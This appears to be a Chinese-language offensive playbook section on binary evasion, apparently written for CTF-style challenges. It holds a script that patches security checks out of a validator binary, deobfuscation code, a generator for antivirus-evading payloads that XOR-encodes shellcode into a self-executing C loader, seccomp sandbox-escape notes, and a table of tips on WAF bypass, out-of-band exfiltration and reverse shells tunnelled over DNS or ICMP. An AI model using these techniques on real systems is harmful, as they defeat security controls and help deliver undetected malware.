## 阶段七：Binary Evasion（二进制对抗规避）

### 7.1 分析检测逻辑
```bash
# 先逆向理解检测点
file ./validator
strings ./validator | grep -iE "detect|check|block|allow|pass|fail|flag"
objdump -d ./validator | head -200

# 用 ltrace 跟踪函数调用
ltrace ./validator < input_file 2>&1 | head -50

# 用 strace 跟踪系统调用
strace -f ./validator < input_file 2>&1 | grep -iE "open|read|write|exec"
```

### 7.2 Binary Patching 绕过检测
```python
#!/usr/bin/env python3
"""通用 binary patching 绕过检测"""

data = bytearray(open('./validator', 'rb').read())

# === 方法 1：反转条件跳转 ===
# 找到检测函数返回后的分支判断，反转 JNE↔JE
# objdump -d ./validator | grep -B5 -A5 "test.*eax\|cmp.*eax"
OFFSET = 0x1234  # 从反汇编确定
data[OFFSET] = 0x74 if data[OFFSET] == 0x75 else 0x75  # JNE↔JE

# === 方法 2：NOP 掉检测调用 ===
# 找到 call <check_function> 的位置，替换为 NOP
CHECK_CALL_OFFSET = 0x5678
CALL_LENGTH = 5  # x86 CALL 指令 = 5 字节
data[CHECK_CALL_OFFSET:CHECK_CALL_OFFSET+CALL_LENGTH] = b'\x90' * CALL_LENGTH

# === 方法 3：让检测函数始终返回 true ===
# 找到检测函数入口，写入 mov eax,1; ret
FUNC_ENTRY = 0xABCD
data[FUNC_ENTRY:FUNC_ENTRY+6] = b'\xb8\x01\x00\x00\x00\xc3'  # mov eax,1; ret

open('./validator_patched', 'wb').write(data)

import os, subprocess
os.chmod('./validator_patched', 0o755)
result = subprocess.run(['./validator_patched'], capture_output=True, text=True, timeout=10)
print(result.stdout, result.stderr)
```

### 7.3 反混淆技巧
```python
#!/usr/bin/env python3
"""反混淆常见模式"""

data = open('./obfuscated', 'rb').read()

# 1. 自解密代码：找到解密循环，提取密钥和密文，用 Python 直接解密
# 特征：一段 XOR 循环 + 一段乱码数据
import re

# 搜索 XOR 循环中的密钥字节
# 常见模式：xor byte [reg+offset], KEY
xor_patterns = re.findall(rb'\x80[\x30-\x37](.)', data)
if xor_patterns:
    print("Possible XOR keys:", [hex(k[0]) for k in xor_patterns])

# 2. 字符串解混淆：逐个函数调用 + 拼接
# 运行程序并 hook 字符串操作
# ltrace ./obfuscated 2>&1 | grep -E "str|mem|printf"

# 3. 控制流平坦化：识别 dispatcher 变量
# 特征：一个大 switch-case 或 if-else 链，通过修改 state 变量跳转
# 策略：NOP 掉 dispatcher，直接连接各个 basic block

# 4. 提取嵌入的加密数据
# 在 .rodata / .data 段中搜索高 entropy 块
from collections import Counter
import math

for offset in range(0, len(data) - 64, 16):
    block = data[offset:offset+64]
    c = Counter(block)
    entropy = -sum(count/64 * math.log2(count/64) for count in c.values() if count)
    if entropy > 6.5:
        print(f"High entropy block at {hex(offset)}: entropy={entropy:.2f}")
        print(f"  hex: {block[:32].hex()}")
```

### 7.4 AV/EDR 规避（免杀）
```python
#!/usr/bin/env python3
"""生成免杀 payload"""

import os

# 1. XOR 编码 shellcode
shellcode = b"\x48\x31\xc0..."  # 原始 shellcode
key = 0x42
encoded = bytes(b ^ key for b in shellcode)

# 2. 生成自解码 C 代码
c_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char buf[] = {{{','.join(f'0x{b:02x}' for b in encoded)}}};

int main() {{
    // XOR 解码
    for (int i = 0; i < sizeof(buf); i++) {{
        buf[i] ^= 0x{key:02x};
    }}
    // 分配可执行内存
    void *exec = mmap(0, sizeof(buf), PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
}}
"""

open('payload.c', 'w').write(c_code)
os.system('gcc -o payload payload.c -z execstack -no-pie')

# 3. 验证
os.system('strings payload | grep -c "bin/sh"')  # 应为 0（已编码）
```

### 7.5 沙箱逃逸
```bash
# 检测沙箱环境
# 常见沙箱特征：
cat /proc/self/status | grep -i seccomp   # seccomp 过滤
cat /proc/self/status | grep -i "Cpus_allowed"  # CPU 限制
ls -la /proc/self/ns/  # namespace 隔离

# 如果是 seccomp：
# 用 seccomp-tools 分析允许的系统调用
seccomp-tools dump ./challenge 2>/dev/null

# 绕过策略：
# 1. 使用允许的 syscall 组合达成目的
# 2. 如果允许 openat + read + write → 读 flag
# 3. 如果允许 execveat → 执行 /bin/sh
```

---

## 常见坑

| 现象 | 可能原因 | 对策 |
|------|---------|------|
| 所有绕过都被拦截 | WAF 规则很严格 | 尝试 HTTP 参数污染 / chunked 传输 / multipart |
| 绕过成功但无回显 | 输出被过滤 | 用外带（DNS/HTTP）或写文件 |
| 上传成功但无法执行 | 上传目录无执行权限 | 检查 .htaccess / nginx 配置 |
| 编码绕过后报错 | 多层编码/解码顺序错误 | 逐层编码测试，确认每层 |
| 反弹 Shell 不出网 | 出站流量被过滤 | 用 ICMP / DNS 隧道，或写文件回读 |
| patch 后程序 crash | 破坏了指令边界 | 确认在指令边界 patch，NOP 补齐到对齐 |
| hex 操作结果不对 | 手动计算出错 | **必须写 Python 脚本，禁止手算** |
| 免杀后仍被检测 | 静态特征泄露 | 检查 strings 输出，确保敏感字符串已编码 |
